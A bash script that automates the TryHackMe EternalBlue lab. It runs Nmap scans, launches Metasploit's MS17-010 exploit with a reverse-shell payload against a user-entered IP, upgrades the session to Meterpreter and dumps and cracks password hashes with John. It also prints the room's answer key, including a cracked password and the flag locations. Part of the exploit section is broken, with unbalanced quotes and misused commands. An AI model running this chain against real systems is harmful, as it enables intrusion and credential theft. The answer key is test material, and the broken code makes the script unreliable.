#!/bin/bash

# ---------------------------------------------
# EternalBlue Lab Automation Script (TryHackMe)
# Author: For Educational Use Only
# ---------------------------------------------

# 💙 General Banner
show_banner() {
    clear
    echo -e "\n\033[1;34m"
    echo "██████▄ ██│     ██│   ██│██████▄"
    echo "██╌╌██│██│     ██│   ██│██╌╌╌╌██"
    echo "██████│██│     ██│   ██│█████▄  "
    echo "██╌╌╌╌│ ██│     ██│   ██│██╌╌╌╌  "
    echo "██│     ██████▄┬═█████▄┬██████▄"
    echo "╌╌│     ╌╌╌╌╌╌╌╌ ╌╌╌╌╌╌╌╌ ╌╌╌╌╌╌╌"
    echo "       🧠 TryHackMe – EternalBlue"
    echo -e "\033[0m"
}

# 🧠 Description Banner
banner_description() {
    echo -e "\n\033[1;36m==[ LAB DESCRIPTION ]==\033[0m"
}

# 📋 Tasks Banner
banner_tasks() {
    echo -e "\n\033[1;35m==[ TASK CHECKLIST ]==\033[0m"
}

# 🔌 VPN Banner
banner_vpn() {
    echo -e "\n\033[1;32m==[ VPN CONNECTION ]==\033[0m"
}

# ⚔️ Exploit Banner
banner_exploit() {
    echo -e "\n\033[1;31m==[ EXPLOITATION LAB ]==\033[0m"
}

# 📖 Answer Banner
banner_answers() {
    echo -e "\n\033[1;33m==[ QUESTIONS & ANSWERS ]==\033[0m"
}

# ---------------------------------------------

# 🧠 Lab description
show_description() {
    banner_description
echo "========================================="
echo "     💣 TRYHACKME: ETERNALBLUE LAB       "
echo "========================================="
sleep 2

echo ""
echo "📖 Background:"
echo "-----------------------------------------"
echo "EternalBlue (MS17-010) is a vulnerability"
echo "in Microsoft SMBv1 protocol, discovered in"
echo "2017 and leaked by a group called Shadow Brokers."
echo "It was weaponized by the NSA (tool: EternalBlue)."
echo ""
sleep 5

echo "⚠️  Impact:"
echo "-----------------------------------------"
echo "- Allowed attackers to execute remote code"
echo "- Led to massive ransomware attacks like WannaCry"
echo "- Affects Windows XP to Windows 8.1 and Server 2008"
echo ""
sleep 5

echo "🎯 Purpose of This Lab:"
echo "-----------------------------------------"
echo "You will:"
echo "- Scan a vulnerable machine"
echo "- Detect open SMB ports"
echo "- Identify the MS17-010 vulnerability"
echo "- Exploit it using Metasploit"
echo "- Gain a Meterpreter shell"
echo "- Capture system flags"
echo ""
sleep 6

echo "🛠️  Tools You'll Use:"
echo "-----------------------------------------"
echo "- Nmap (for scanning)"
echo "- smb-vuln-ms17-010 NSE script"
echo "- Metasploit Framework"
echo "- Windows post-exploitation commands"
echo ""
sleep 5

echo "🚀 Learning Objectives:"
echo "-----------------------------------------"
echo "1. Understand what EternalBlue is"
echo "2. Learn how to scan for vulnerable SMB ports"
echo "3. Exploit a system with Metasploit"
echo "4. Practice post-exploitation techniques"
echo ""
sleep 5

echo "🔐 Why is it important?"
echo "-----------------------------------------"
echo "Because EternalBlue shows how a single unpatched"
echo "bug in a service (SMB) can bring down thousands"
echo "of systems globally."
echo ""
sleep 4

echo "🧠 Ethical Reminder:"
echo "-----------------------------------------"
echo "This lab is for educational use only!"
echo "Never scan or exploit machines you don't own"
echo "or have explicit permission to test."
echo ""
sleep 4

echo "✅ You're ready to start the lab!"
echo "-----------------------------------------"
echo "1. Connect to VPN"
echo "2. Scan with Nmap"
echo "3. Use Metasploit's eternalblue module"
echo "4. Capture the flag"
echo ""
sleep 3

echo "🖱️  Tip: Use 'nmap -p 445 --script smb-vuln* <IP>'"
echo "       and 'msfconsole' to launch your exploit"
echo ""

echo "========================================="
echo "     ✅ END OF ETERNALBLUE INTRO         "
echo "========================================="
read -p "[*] Press Enter to return to the menu..."
}

# 📋 Lab task checklist
show_tasks() {
    banner_tasks
   sleep 1
    echo "1. Connect to TryHackMe VPN"
    sleep 1
    echo "2. Discover target machine"
    sleep 1
    echo "3. Scan with Nmap"
     sleep 1
    echo "4. Identify MS17-010 vulnerability"
     sleep 1
    echo "5. Exploit using Metasploit"
     sleep 1
    echo "6. Convert shell to Meterpreter"
     sleep 1
    echo "7. Dump and crack hashes"
     sleep 1
    echo "8. Find the flags "
     sleep 4
     read -p "[*] Press Enter to return to the menu..."
}

# 🔌 Function: Connect VPN only
connect_vpn() {
clear
    read -p "[?] Enter path to your TryHackMe .ovpn file: " vpnfile
    if [[ ! -f "$vpnfile" ]]; then
        echo "[!] Error: File not found: $vpnfile"
        return
    fi

    echo "[+] Starting VPN..."
    sudo openvpn --config "$vpnfile"
    read -p "[*] Press Enter to return to the menu..."
}
# ⚔️ Function: Run full exploit process
exploit_lab() {
    read -p "[?] Enter path to your TryHackMe .ovpn file: " vpnfile
    if [[ ! -f "$vpnfile" ]]; then
        echo "[!] Error: File not found: $vpnfile"
        return
    fi

    echo "[+] Connecting VPN..."
    sudo openvpn --config "$vpnfile" &
    sleep 10

    echo "[i] VPN started. Checking interface..."
    ip a | grep tun

    read -p "[?] Enter Target IP (RHOST): " rhost
    read -p "[?] Enter Your IP (LHOST): " lhost
    read -p "[?] Enter Listening Port (LPORT, default 4444): " lport
    lport=${lport:-4444}

    echo "[+] Running Nmap (basic scan)..."
    nmap -sS -sV -O -Pn "$rhost" -oN initial_scan.txt

    echo "[+] Running Nmap (vuln scripts)..."
    nmap -sV --script vuln "$rhost" -oN vuln_scan.txt

    echo "[i] Scan complete. Saved to initial_scan.txt and vuln_scan.txt"
    echo "[*] Launching EternalBlue exploit in Metasploit..."

    msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue;
set RHOSTS $rhost;
set LHOST $lhost;
set LPORT $lport;
set PAYLOAD windows/x64/shell/reverse_tcp;
exploit -y;
sessions;
"

    echo -e "\n[*] Waiting for session... Use 'sessions' in a new terminal to verify."

    echo -p "[?] Enter active session ID to upgrade to Meterpreter: " 
    echo "msfconsole -q -x "
echo "use post/multi/manage/shell_to_meterpreter;"
echo "set SESSION session"
echo "run"
echo -e "\n[*] Meterpreter session should now be live."
 echo -e "[*] Switching to Meterpreter to run post-exploitation..."
echo "sessions -i $session;"
echo "sysinfo;"
echo "hashdump;"
"

    read -p "[?] Paste any cracked hash to crack (only the hash portion): " hash
    echo "$hash" > hash1.txt

    echo "[*] Cracking with rockyou.txt..."
    john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt

    echo -e "\n[✓] Done. Use 'sessions -i <ID>' to reattach anytime."
}
# 📖 Lab Q&A section
show_answers() {
    banner_answers
    echo "🔹 How many ports under 1000 are open?"
    echo "➡️  3"
     sleep 1
    echo "🔹 Vulnerable to?"
    echo "➡️  ms17-010"
     sleep 1
    echo "🔹 Exploit path?"
    echo "➡️  exploit/windows/smb/ms17_010_eternalblue"
     sleep 1
    echo "🔹 Required option name?"
    echo "➡️  RHOSTS"
     sleep 1
    echo "🔹 Shell-to-Meterpreter module?"
    echo "➡️  post/multi/manage/shell_to_meterpreter"
     sleep 1
    echo "🔹 Required post module option?"
    echo "➡️  SESSION"
     sleep 1
    echo "🔹 Non-default user?"
    echo "➡️  jon"
     sleep 1
    echo "🔹 Cracked password?"
    echo "➡️  alqfna22"
     sleep 1
    echo "🔹 Flag1:"
    echo "➡️  C:\\flag1.txt"
     sleep 1
    echo "🔹 Flag2:"
    echo "➡️  C:\\Windows\\System32\\config\\flag2.txt"
     sleep 1
    echo "🔹 Flag3:"
    echo "➡️  C:\\Users\\Administrator\\Documents\\flag3.txt"
     sleep 1
    read -p "[*] Press Enter to return to the menu..."
}

# 🧱 Main menu loop
while true; do
    show_banner
    echo "--------------------------------------------"
    echo "1. View Lab Description"
    echo "2. View Task Checklist"
    echo "3. Connect to VPN Only"
    echo "4. Start Exploitation Lab"
    echo "5. View Lab Questions and Answers"
    echo "6. Exit"
    echo "--------------------------------------------"
    read -p "[*] Choose an option [1-6]: " choice

    case $choice in
        1) show_description ;;
        2) show_tasks ;;
        3) connect_vpn ;;
        4) exploit_lab ;;
        5) show_answers ;;
        6) echo "[✓] Goodbye!"; exit 0 ;;
        *) echo "[!] Invalid option. Please enter 1–6." ;;
    esac
done
